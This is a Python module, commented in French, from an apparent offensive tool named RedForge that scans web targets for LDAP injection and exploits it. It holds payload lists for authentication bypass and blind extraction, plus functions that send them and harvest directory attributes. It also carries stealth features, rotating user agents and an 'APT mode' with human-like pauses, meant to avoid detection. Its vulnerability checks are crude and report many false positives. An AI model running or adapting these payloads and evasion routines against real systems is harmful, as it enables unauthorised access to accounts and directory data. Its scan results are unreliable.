#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'injection LDAP pour RedForge
Détecte et exploite les vulnérabilités d'injection LDAP
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
import base64
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class LDAPInjectionConfig:
    """Configuration avancée pour l'injection LDAP"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_tests: Tuple[float, float] = (1, 3)
    
    # Comportement
    max_payloads: int = 50
    timeout: int = 10
    test_blind: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_ldap_errors: bool = True
    test_boolean_blind: bool = True
    max_blind_attempts: int = 20


class LDAPInjection:
    """Détection et exploitation avancée des injections LDAP"""
    
    def __init__(self, config: Optional[LDAPInjectionConfig] = None):
        """
        Initialise le détecteur d'injection LDAP
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or LDAPInjectionConfig()
        
        # Payloads d'injection LDAP organisés par catégorie
        self.payloads = self._generate_payloads()
        
        # Signatures d'erreur LDAP
        self.ldap_error_signatures = [
            r'LDAPException', r'javax.naming.NameNotFoundException',
            r'LDAPSearchException', r'com.sun.jndi.ldap',
            r'Invalid DN syntax', r'LDAP: error code',
            r'javax.naming.directory', r'SearchResult', r'LDAPBindException',
            r'LDAPException: result code', r'javax.naming.AuthenticationException',
            r'javax.naming.NameNotFoundException', r'LDAP error',
            r'ldap_search\(\)', r'ldap_bind\(\)', r'ldap_get_attributes',
            r'LDAP: error code 49', r'LDAP: error code 32', r'LDAP: error code 50'
        ]
        
        # Patterns de succès d'authentification
        self.auth_success_patterns = [
            r'welcome', r'dashboard', r'login success', r'authenticated',
            r'successfully logged in', r'redirecting', r'profile'
        ]
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
    
    def _generate_payloads(self) -> Dict[str, List[str]]:
        """Génère une liste complète de payloads d'injection LDAP"""
        payloads = {
            "Authentication Bypass": [
                "*)(uid=*",
                "*)(|(uid=*",
                "*))(|(uid=*",
                "admin*",
                "admin*)((|userPassword=*)",
                "*)(uid=*))(|(uid=*",
                "*)(|(password=*)",
                "*)(|(cn=*",
                "*)) (cn=*",
                "*)(&(uid=*",
                "*) (|(uid=*",
                "admin)(|(password=*",
                "admin)(&(cn=*)(sn=*"
            ],
            "Boolean Based": [
                "(&(uid=*)(cn=admin))",
                "(&(uid=admin)(cn=*))",
                "(|(uid=admin)(cn=*))",
                "(&(uid=admin)(|(cn=*)(sn=*)))",
                "(&(uid=admin)(!(cn=nonexistent)))",
                "(&(uid=admin)(cn=admin))",
                "(|(uid=admin)(uid=*))",
                "(&(uid=admin)(objectClass=*))"
            ],
            "Union Based": [
                "admin)(|(password=*",
                "admin)(cn=*",
                "admin)(|(cn=*)(sn=*",
                "*)(|(cn=test",
                "*)(cn=*",
                "admin)(&(cn=*)(sn=*",
                "admin)(|(mail=*",
                "admin)(!(cn=nonexistent"
            ],
            "Special Characters": [
                "*", "(", ")", "&", "|", "!", "=", "~=", ">=", "<=",
                "*admin*", "admin*", "*admin", "admin*(", "*admin)",
                "admin*)", "(*admin", ")(admin", "admin)(*"
            ],
            "Blind Boolean": [
                "admin)(cn=*",
                "admin)(!(cn=admin",
                "*)(|(uid=*",
                "admin)(&(cn=*)(sn=*",
                "admin)(cn=*))(|(cn=admin",
                "admin)(objectClass=*",
                "admin)(memberOf=*",
                "admin)(mail=*"
            ],
            "Blind Time": [
                "admin)(|(uid={uid})",
                "admin)(&(cn=*)(sn=*",
                "*)(|(uid={uid})"
            ],
            "Encoded": [
                base64.b64encode(b"*)(uid=*").decode(),
                base64.b64encode(b"admin)(|(password=*").decode(),
                quote("*)(uid=*"),
                quote("admin)(|(password=*")
            ]
        }
        
        return payloads
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités d'injection LDAP
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - params: Paramètres spécifiques à tester
                - data: Données POST
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Scan des injections LDAP sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        vulnerabilities = []
        tested_params = set()
        
        params_to_test = self._get_params_to_test(target, kwargs)
        post_data = kwargs.get('data')
        
        for idx, param in enumerate(params_to_test):
            if param in tested_params:
                continue
            tested_params.add(param)
            
            # Pause APT
            if self.config.apt_mode and idx > 0:
                self._apt_pause()
            elif self.config.random_delays and idx > 0:
                time.sleep(random.uniform(*self.config.delay_between_tests))
            
            param_vulns = self._test_parameter(target, param, post_data)
            vulnerabilities.extend(param_vulns)
            
            if param_vulns:
                self.vulnerabilities_found += len(param_vulns)
                for vuln in param_vulns:
                    print(f"      ✓ Injection LDAP: {param} -> {vuln['payload'][:40]}...")
        
        return self._generate_results(target, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'max_payloads' in kwargs:
            self.config.max_payloads = kwargs['max_payloads']
        if 'test_blind' in kwargs:
            self.config.test_blind = kwargs['test_blind']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.max_payloads = min(self.config.max_payloads, 20)
            self.config.delay_between_tests = (5, 15)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _get_params_to_test(self, target: str, kwargs: Dict) -> List[str]:
        """Récupère la liste des paramètres à tester"""
        params = kwargs.get('params', [])
        
        if not params:
            params = self._extract_params(target)
        
        if not params:
            params = ['user', 'username', 'login', 'cn', 'uid', 'mail', 'email', 
                     'dn', 'filter', 'search', 'query', 'name', 'givenName',
                     'sn', 'department', 'title', 'role', 'group']
        
        # Limiter en mode APT
        if self.config.apt_mode:
            params = params[:10]
        
        return params
    
    def _extract_params(self, target: str) -> List[str]:
        """Extrait les paramètres de l'URL"""
        parsed = urlparse(target)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _test_parameter(self, target: str, param: str, 
                        post_data: Optional[str] = None) -> List[Dict[str, Any]]:
        """Teste un paramètre pour les injections LDAP"""
        vulnerabilities = []
        payloads_tested = 0
        
        for category, payload_list in self.payloads.items():
            for payload in payload_list[:self.config.max_payloads]:
                # Pause entre les tests
                if self.config.random_delays and payloads_tested > 0:
                    time.sleep(random.uniform(0.3, 0.8))
                
                result = self._test_payload(target, param, payload, post_data)
                self.payloads_tested += 1
                payloads_tested += 1
                
                if result['vulnerable']:
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload[:80] + "..." if len(payload) > 80 else payload,
                        "category": category,
                        "severity": "HIGH",
                        "evidence": result['evidence'],
                        "type": result.get('type', 'unknown'),
                        "risk_score": 85
                    })
                    return vulnerabilities  # Arrêter pour ce paramètre
        
        return vulnerabilities
    
    def _test_payload(self, target: str, param: str, payload: str,
                      post_data: Optional[str] = None) -> Dict[str, Any]:
        """Teste un payload d'injection LDAP"""
        result = {
            'vulnerable': False,
            'evidence': '',
            'type': None
        }
        
        try:
            headers = self._get_stealth_headers()
            
            if post_data:
                # Requête POST
                if isinstance(post_data, dict):
                    data_params = post_data.copy()
                else:
                    data_params = parse_qs(post_data) if post_data else {}
                    data_params = {k: v[0] if isinstance(v, list) else v for k, v in data_params.items()}
                
                data_params[param] = payload
                response = requests.post(target, data=data_params, headers=headers,
                                       timeout=self.config.timeout, verify=False)
            else:
                # Requête GET
                parsed = urlparse(target)
                query_params = parse_qs(parsed.query)
                
                if param in query_params:
                    query_params[param] = [payload]
                else:
                    query_params[param] = [payload]
                
                new_query = urlencode(query_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                response = requests.get(test_url, headers=headers,
                                      timeout=self.config.timeout, verify=False)
            
            # Détection d'erreurs LDAP
            if self.config.detect_ldap_errors:
                for signature in self.ldap_error_signatures:
                    if re.search(signature, response.text, re.IGNORECASE):
                        result['vulnerable'] = True
                        result['evidence'] = signature
                        result['type'] = 'error_based'
                        return result
            
            # Détection de bypass d'authentification
            if 'admin' in payload.lower():
                for pattern in self.auth_success_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        result['vulnerable'] = True
                        result['evidence'] = pattern
                        result['type'] = 'auth_bypass'
                        return result
            
            # Détection de changements de comportement
            if len(response.text) > 1000 and response.status_code == 200:
                result['vulnerable'] = True
                result['evidence'] = 'behavior_change'
                result['type'] = 'boolean_based'
                
        except requests.Timeout:
            pass
        except Exception:
            pass
        
        return result
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "payloads_tested": self.payloads_tested,
            "scan_duration": duration,
            "payloads_per_second": self.payloads_tested / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "detect_ldap_errors": self.config.detect_ldap_errors
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune injection LDAP détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_category": {
                "auth_bypass": len([v for v in vulnerabilities if v['category'] == 'Authentication Bypass']),
                "boolean": len([v for v in vulnerabilities if v['category'] == 'Boolean Based']),
                "blind": len([v for v in vulnerabilities if v['category'] == 'Blind Boolean'])
            },
            "by_type": {
                "error_based": len([v for v in vulnerabilities if v['type'] == 'error_based']),
                "boolean_based": len([v for v in vulnerabilities if v['type'] == 'boolean_based']),
                "auth_bypass": len([v for v in vulnerabilities if v['type'] == 'auth_bypass'])
            },
            "high_severity": len(vulnerabilities),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        if vulnerabilities:
            recommendations.add("Utiliser des requêtes LDAP paramétrées")
            recommendations.add("Échapper les caractères spéciaux LDAP (*, (, ), \\, NUL)")
            recommendations.add("Valider et filtrer les entrées utilisateur")
        
        if any(v['category'] == 'Authentication Bypass' for v in vulnerabilities):
            recommendations.add("Implémenter une authentification multi-facteurs")
            recommendations.add("Ne pas utiliser de filtres LDAP dynamiques pour l'authentification")
        
        if any(v['type'] == 'error_based' for v in vulnerabilities):
            recommendations.add("Désactiver les messages d'erreur LDAP détaillés")
        
        return list(recommendations)
    
    def bypass_auth(self, target: str, param: str, 
                    post_data: Optional[str] = None) -> Dict[str, Any]:
        """
        Tente de contourner l'authentification LDAP
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            post_data: Données POST optionnelles
        """
        bypass_payloads = [
            "*)(uid=*",
            "*)(|(uid=*",
            "*))(|(uid=*",
            "admin*",
            "admin*)((|userPassword=*)",
            "*)(uid=*))(|(uid=*",
            "admin)(|(password=*",
            "admin)(&(cn=*)(sn=*"
        ]
        
        for payload in bypass_payloads:
            result = self._test_payload(target, param, payload, post_data)
            if result['vulnerable']:
                return {
                    "success": True,
                    "payload": payload,
                    "evidence": result['evidence'],
                    "type": result['type']
                }
        
        return {"success": False}
    
    def extract_info(self, target: str, param: str,
                     post_data: Optional[str] = None) -> Dict[str, Any]:
        """
        Tente d'extraire des informations via injection LDAP
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            post_data: Données POST optionnelles
        """
        result = {
            "success": False,
            "extracted": [],
            "method": None,
            "attributes": []
        }
        
        # Payloads pour extraction d'information
        info_payloads = [
            "*)(|(uid=admin",
            "*)(|(cn=admin",
            "*)(|(mail=admin",
            "*)(|(sn=admin",
            "*)(|(givenName=admin",
            "*)(|(department=admin",
            "*)(|(title=admin",
            "*)(|(memberOf=admin"
        ]
        
        for payload in info_payloads:
            test_result = self._test_payload(target, param, payload, post_data)
            if test_result['vulnerable']:
                result["success"] = True
                result["extracted"].append(payload)
                result["method"] = "information_disclosure"
                result["attributes"].append(payload.split('=')[0].split('(')[-1])
        
        # Extraction par boolean blind
        if self.config.test_boolean_blind and not result["success"]:
            blind_result = self._blind_extract(target, param, post_data)
            if blind_result["success"]:
                result.update(blind_result)
        
        return result
    
    def _blind_extract(self, target: str, param: str,
                       post_data: Optional[str] = None) -> Dict[str, Any]:
        """
        Extraction d'information par blind boolean injection LDAP
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            post_data: Données POST optionnelles
        """
        result = {
            "success": False,
            "extracted": [],
            "method": "blind_boolean",
            "attributes": []
        }
        
        # Attributs LDAP courants à extraire
        attributes = ['uid', 'cn', 'sn', 'givenName', 'mail', 'telephoneNumber', 
                      'title', 'department', 'manager', 'memberOf']
        
        base_payload = "admin)({attr}=*"
        
        for attr in attributes:
            payload = base_payload.format(attr=attr)
            test_result = self._test_payload(target, param, payload, post_data)
            
            if test_result['vulnerable']:
                result["success"] = True
                result["attributes"].append(attr)
                result["extracted"].append(payload)
        
        return result
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "payloads_tested": self.payloads_tested,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.payloads_tested) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    injection = LDAPInjection()
    results = injection.scan("https://example.com/login?user=admin")
    print(f"Vulnérabilités LDAP: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = LDAPInjectionConfig(apt_mode=True, max_payloads=20)
    injection_apt = LDAPInjection(config=apt_config)
    results_apt = injection_apt.scan("https://example.com/login?user=admin", apt_mode=True)
    print(f"Vulnérabilités LDAP (APT): {results_apt['count']}")
    
    # Exemple de bypass d'authentification
    if results_apt['vulnerabilities']:
        vuln = results_apt['vulnerabilities'][0]
        bypass_result = injection_apt.bypass_auth(
            "https://example.com/login",
            vuln['parameter']
        )
        if bypass_result['success']:
            print(f"Bypass réussi: {bypass_result['payload']}")
    
    # Afficher les recommandations
    for rec in results_apt['recommendations']:
        print(f"Recommandation: {rec}")